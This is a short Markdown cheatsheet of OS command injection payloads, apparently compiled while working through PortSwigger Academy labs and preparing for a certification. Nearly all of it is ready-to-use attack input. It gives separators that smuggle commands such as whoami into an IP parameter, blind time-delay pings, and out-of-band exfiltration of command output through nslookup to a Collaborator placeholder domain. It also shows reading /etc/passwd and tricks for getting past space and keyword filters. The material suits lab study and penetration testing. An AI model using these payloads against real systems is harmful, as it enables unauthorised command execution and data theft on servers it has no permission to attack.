# 💻 OS Command Injection Cheatsheet

Tested methodology, bypass techniques, and payloads compiled during PortSwigger Academy labs and BSCP preparation.
---

## 📌 Attack Vectors & Methodology

* Target Parameters: `?ip=`, `?host=`, `?email=`, `?filename=`, `?dir=`
* Key Command Separators:
  - Linux: `;`, `|`, `&`, `\n` (`0x0a`), `$(command)`, `` `command` ``
  - Windows: `&`, `|`, `%0a%`

---

## 🛠️ Payloads & Bypass Techniques

### 1. In-Band / Direct OS Command Injection

* Basic Separators:
  - `127.0.0.1; whoami`
  - `127.0.0.1 | whoami`
  - `127.0.0.1 & whoami`
  - `127.0.0.1 || whoami`

---

### 2. Blind OS Command Injection (Time Delays)

* Triggering Execution Delays:
  - `127.0.0.1; ping -c 10 127.0.0.1 #`
  - `127.0.0.1 || ping -c 10 127.0.0.1 #`
  - `& ping -c 10 127.0.0.1 &`

---

### 3. Blind OS Command Injection (Output Exfiltration)

* Output Redirection to Web Root:
  - `127.0.0.1; whoami > /var/www/static/whoami.txt`

* Out-of-Band (OAST) via Burp Collaborator:
  - `127.0.0.1; nslookup BURP-COLLABORATOR-SUBDOMAIN`
  - `127.0.0.1; nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN`

---

### 4. Bypass Techniques

* Space Filtering Bypasses:
  - `${IFS}` ➔ `127.0.0.1;whoami$IFS`
  - Redirection ➔ `cat</etc/passwd`

* Blacklisted Command Bypasses:
  - Concatenation: `w'h'o'a'm'i` or `w"h"o"a"m"i`
  - Environment Variables: `/usr/bin/p'i'ng`

---
